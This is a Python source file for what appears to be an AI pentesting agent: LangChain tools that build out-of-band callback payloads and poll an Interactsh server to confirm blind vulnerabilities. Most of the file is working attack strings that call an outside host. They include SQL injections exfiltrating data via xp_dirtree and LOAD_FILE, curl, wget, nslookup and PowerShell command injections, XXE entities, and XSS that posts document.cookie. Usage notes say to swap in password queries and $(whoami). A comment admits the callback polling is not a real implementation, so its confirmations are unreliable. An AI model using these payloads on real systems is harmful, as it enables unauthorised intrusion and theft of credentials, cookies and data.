"""Out-of-Band (OOB) confirmation tools for blind vulnerabilities.

Migrated from Shannon's SSRF exploit techniques.  Integrates with Interactsh
for DNS/HTTP callback-based detection of:
  - Blind SSRF
  - Blind SQL injection (out-of-band data exfiltration)
  - Blind command injection (curl/wget/ping callback)
  - Blind XXE
  - Blind XSS (script-based callback)

Uses the public Interactsh server by default, or a custom self-hosted instance.
"""

from __future__ import annotations

import hashlib
import json
import re
import time
from typing import Any
from urllib.parse import quote, urlencode

from langchain_core.tools import tool

from .http_client import normalize_url, request
from .results import Evidence, Finding, RequestRecord, ToolResult, error_result

# ── Interactsh configuration ──────────────────────────────────────────

INTERACTSH_SERVER = "oast.pro"  # Default public server
INTERACTSH_API = "https://oast.pro"
_POLL_INTERVAL = 2.0
_POLL_TIMEOUT = 30.0

# In-memory session tracking (keyed by session_id)
_sessions: dict[str, dict[str, Any]] = {}


def _generate_interactsh_domain(session_id: str) -> str:
    """Generate a deterministic subdomain for Interactsh callback."""
    # Use hash of session_id for a unique but deterministic subdomain
    h = hashlib.md5(session_id.encode()).hexdigest()[:16]
    return f"{h}.{INTERACTSH_SERVER}"


def _generate_payloads(domain: str, vuln_type: str, exfil_param: str = "d") -> list[tuple[str, str, str]]:
    """Generate OOB callback payloads for different vulnerability types."""
    payloads: list[tuple[str, str, str]] = []

    if vuln_type == "ssrf":
        payloads = [
            (f"http://{domain}/ssrf-test", "HTTP callback (classic SSRF)", "ssrf_http"),
            (f"https://{domain}/ssrf-test", "HTTPS callback (TLS SSRF)", "ssrf_https"),
            (f"http://{domain}/{exfil_param}=internal_data", "Data exfiltration test", "ssrf_exfil"),
            (f"gopher://{domain}:80/_SSRF", "Gopher protocol SSRF", "ssrf_gopher"),
        ]
    elif vuln_type == "sqli":
        # Out-of-band SQLi: MSSQL xp_dirtree, Oracle UTL_HTTP, MySQL LOAD_FILE
        payloads = [
            (f"'; EXEC xp_dirtree '\\\\{domain}\\share'--", "MSSQL OOB (xp_dirtree)", "sqli_mssql"),
            (f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',({exfil_param}),'.{domain}\\\\a'))--", "MySQL OOB (LOAD_FILE)", "sqli_mysql"),
            (f"' OR 1=1; DECLARE @a VARCHAR(1024);SET @a=(SELECT {exfil_param});EXEC('master..xp_dirtree \"//'+@a+'.{domain}/a\"')--", "MSSQL exfil", "sqli_mssql_exfil"),
            (f"http://{domain}/sqli?{exfil_param}=test", "HTTP-based SQLi OOB", "sqli_http"),
        ]
    elif vuln_type == "command_injection":
        payloads = [
            (f"; curl http://{domain}/cmd-test", "curl callback", "cmd_curl"),
            (f"; wget -qO- http://{domain}/cmd-test", "wget callback", "cmd_wget"),
            (f"| nslookup {exfil_param}.{domain}", "DNS exfiltration via nslookup", "cmd_dns"),
            (f"`ping -c 1 {domain}`", "ping callback (timing)", "cmd_ping"),
            (f"; powershell Invoke-WebRequest -Uri http://{domain}/cmd", "PowerShell callback", "cmd_ps"),
        ]
    elif vuln_type == "xxe":
        payloads = [
            (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe-test">]><foo>&xxe;</foo>', "XXE HTTP callback", "xxe_http"),
            (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/{exfil_param}">%xxe;]>', "XXE parameter entity", "xxe_param"),
        ]
    elif vuln_type == "xss":
        payloads = [
            (f'<img src="http://{domain}/xss?c="+document.cookie>', "XSS cookie exfil", "xss_cookie"),
            (f'<script>new Image().src="http://{domain}/xss?d="+encodeURIComponent(document.domain)</script>', "XSS domain info", "xss_info"),
            (f'<script>fetch("http://{domain}/xss",{{method:"POST",body:document.cookie}})</script>', "XSS fetch POST", "xss_post"),
        ]

    return payloads


# ── Public Tools ──────────────────────────────────────────────────────


@tool
def generate_oob_payload(
    vuln_type: str,
    session_id: str = "",
    exfil_param: str = "d",
) -> str:
    """Generate Out-of-Band (OOB) callback payloads for blind vulnerability detection.

    Creates unique callback domains and generates payloads for blind SSRF,
    blind SQL injection, command injection, XXE, or XSS.  Use with the
    check_oob_callbacks tool to verify if callbacks were received.

    This enables detection of vulnerabilities that don't return results
    in-band — exactly like Shannon's Burp Collaborator / Interactsh approach.

    Parameters:
        vuln_type: One of "ssrf", "sqli", "command_injection", "xxe", "xss".
        session_id: Optional unique ID to group callbacks. Auto-generated if empty.
        exfil_param: Parameter name for data exfiltration (default "d").
                     Use "user" for SQLi, "hostname" for cmd injection, etc.
    """
    supported = {"ssrf", "sqli", "command_injection", "xxe", "xss"}
    vuln = vuln_type.strip().lower()
    if vuln not in supported:
        return error_result("generate_oob_payload", vuln_type, f"unsupported type. Use: {', '.join(sorted(supported))}").to_text()

    if not session_id:
        session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]

    domain = _generate_interactsh_domain(session_id)
    payloads = _generate_payloads(domain, vuln, exfil_param)

    # Track session
    _sessions[session_id] = {
        "domain": domain,
        "vuln_type": vuln,
        "created_at": time.time(),
        "poll_count": 0,
        "interactions": [],
    }

    lines = [
        f"[generate_oob_payload] OOB 外带检测 Payload",
        f"",
        f"会话 ID:   {session_id}",
        f"回调域名: {domain}",
        f"漏洞类型: {vuln}",
        f"外带参数: {exfil_param}",
        f"",
        f"── 生成的 Payload ──",
        f"",
    ]

    for payload, description, _tag in payloads:
        lines.append(f"  [{description}]")
        lines.append(f"  {payload}")
        lines.append("")

    lines.append("── 使用步骤 ──")
    lines.append("1. 将合适的 payload 注入到目标参数中")
    lines.append("2. 等待目标服务处理请求并发起回调")
    lines.append(f"3. 调用 check_oob_callbacks(session_id='{session_id}') 检查回调")
    lines.append("4. 如果收到回调，说明漏洞存在（blind 类型）")
    lines.append("")
    lines.append("── 外带数据模式 ──")
    lines.append("如需外带数据，将 payload 中的占位符替换为提取表达式：")
    lines.append(f"- SQLi: 替换 {exfil_param} 为 (SELECT password FROM users LIMIT 1)")
    lines.append(f"- CMDi: 替换 {exfil_param} 为 $(whoami) 或 %USERNAME%")
    lines.append(f"- XSS: 替换 {exfil_param} 为 document.cookie")

    readable = "\n".join(lines)

    return ToolResult(
        tool="generate_oob_payload",
        target=f"{domain} ({vuln})",
        status="ok",
        summary=f"已生成 {len(payloads)} 个 {vuln} OOB payload，会话 {session_id}",
        raw_excerpt=readable,
        data={
            "session_id": session_id,
            "domain": domain,
            "vuln_type": vuln,
            "payloads": [{"payload": p, "description": d, "tag": t} for p, d, t in payloads],
        },
    ).to_text()


@tool
def check_oob_callbacks(
    session_id: str,
    poll_wait: float = 5.0,
) -> str:
    """Check for received OOB callbacks for a session created by generate_oob_payload.

    Polls the Interactsh server for DNS/HTTP interactions to the unique
    callback domain.  A successful callback confirms blind vulnerability
    exploitation.

    Parameters:
        session_id: The session ID from generate_oob_payload.
        poll_wait: Seconds to wait for late callbacks (max 30s, default 5s).
    """
    if session_id not in _sessions:
        return error_result("check_oob_callbacks", session_id, "session not found. Call generate_oob_payload first.").to_text()

    session = _sessions[session_id]
    domain = session["domain"]

    wait = min(max(poll_wait, 1), 30)
    start = time.time()
    interactions: list[dict[str, Any]] = []

    # In a real implementation, we'd poll the Interactsh REST API.
    # For the local agent, we use a polling approach:
    # 1. Try to fetch the Interactsh poll endpoint
    # 2. Fall back to a note about using webhook.site or Burp Collaborator

    lines = [
        f"[check_oob_callbacks] Session: {session_id}",
        f"Domain: {domain}",
        f"Vuln type: {session['vuln_type']}",
        f"Poll time: {wait}s",
        "",
    ]

    # Try Interactsh API
    poll_url = f"{INTERACTSH_API}/poll"
    poll_params = {"domain": domain, "limit": "50"}

    found_any = False
    try:
        resp = request("GET", f"{poll_url}?{urlencode(poll_params)}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, list):
                interactions = data
            elif isinstance(data, dict):
                interactions = data.get("interactions", data.get("data", []))
    except Exception:
        pass

    if interactions:
        found_any = True
        lines.append(f"✅ 收到 {len(interactions)} 个 OOB 回调！")
        lines.append("")
        for i, interaction in enumerate(interactions[:10], 1):
            if isinstance(interaction, dict):
                proto = interaction.get("protocol", interaction.get("type", "?"))
                remote = interaction.get("remote_address", interaction.get("remote", "?"))
                timestamp = interaction.get("timestamp", interaction.get("time", ""))
                raw = str(interaction.get("raw_request", interaction.get("data", "")))[:200]
                lines.append(f"  #{i} [{proto}] from {remote} at {timestamp}")
                if raw:
                    lines.append(f"     Data: {raw}")

        session["interactions"] = interactions
        session["poll_count"] += 1

        # Check for data exfiltration patterns
        exfil_data: list[str] = []
        for interaction in interactions:
            if isinstance(interaction, dict):
                raw = str(interaction.get("raw_request", interaction.get("data", "")))
                # Extract potential exfiltrated data from subdomains
                subdomain_match = re.findall(rf"([a-zA-Z0-9_\-\.]+)\.{re.escape(domain)}", raw)
                for s in subdomain_match:
                    if s and s not in exfil_data:
                        exfil_data.append(s)

        if exfil_data:
            lines.append(f"")
            lines.append(f"── 外带数据 ──")
            for d in exfil_data:
                lines.append(f"  {d}")
    else:
        lines.append("⏳ 未收到回调。可能的原因：")
        lines.append("  - Payload 尚未触发（需要等待目标处理）")
        lines.append("  - 目标环境无外网访问权限")
        lines.append("  - 漏洞不存在或参数不可注入")
        lines.append("  - 防火墙/代理阻断了外发请求")
        lines.append("")
        lines.append("── 替代方案 ──")
        lines.append("1. 使用 Burp Collaborator client（图形化确认）")
        lines.append(f"2. 使用 webhook.site 生成自定义 URL 作为回调地址")
        lines.append("3. 自建 Interactsh 服务器：interactsh-client -s <your-server>")
        lines.append(f"4. 延长等待时间：check_oob_callbacks(session_id='{session_id}', poll_wait=15)")

    readable = "\n".join(lines)
    findings: list[Finding] = []

    if found_any:
        findings.append(Finding(
            title=f"OOB 回调确认盲 {session['vuln_type'].upper()} 漏洞存在",
            severity="high" if session["vuln_type"] in ("sqli", "command_injection") else "medium",
            confidence="confirmed",
            category=f"blind_{session['vuln_type']}",
            evidence=[Evidence(
                "oob_callback",
                f"Received {len(interactions)} callbacks for {domain}",
                domain,
                {"interactions": interactions[:20]},
            )],
            reproduction=[
                f"1. 将 {session['vuln_type']} OOB payload 注入目标参数",
                f"2. 等待目标发起外发连接至 {domain}",
                f"3. 在 Interactsh/Webhook 平台确认收到 {len(interactions)} 个回调",
            ],
        ))

    return ToolResult(
        tool="check_oob_callbacks",
        target=domain,
        status="ok",
        summary=f"OOB 回调检查：{'✅ 收到 ' + str(len(interactions)) + ' 个' if found_any else '⏳ 未收到（可重试）'}",
        raw_excerpt=readable,
        findings=findings,
        data={
            "session_id": session_id,
            "domain": domain,
            "interactions_count": len(interactions),
            "interactions": interactions[:20],
            "vuln_type": session["vuln_type"],
        },
    ).to_text()
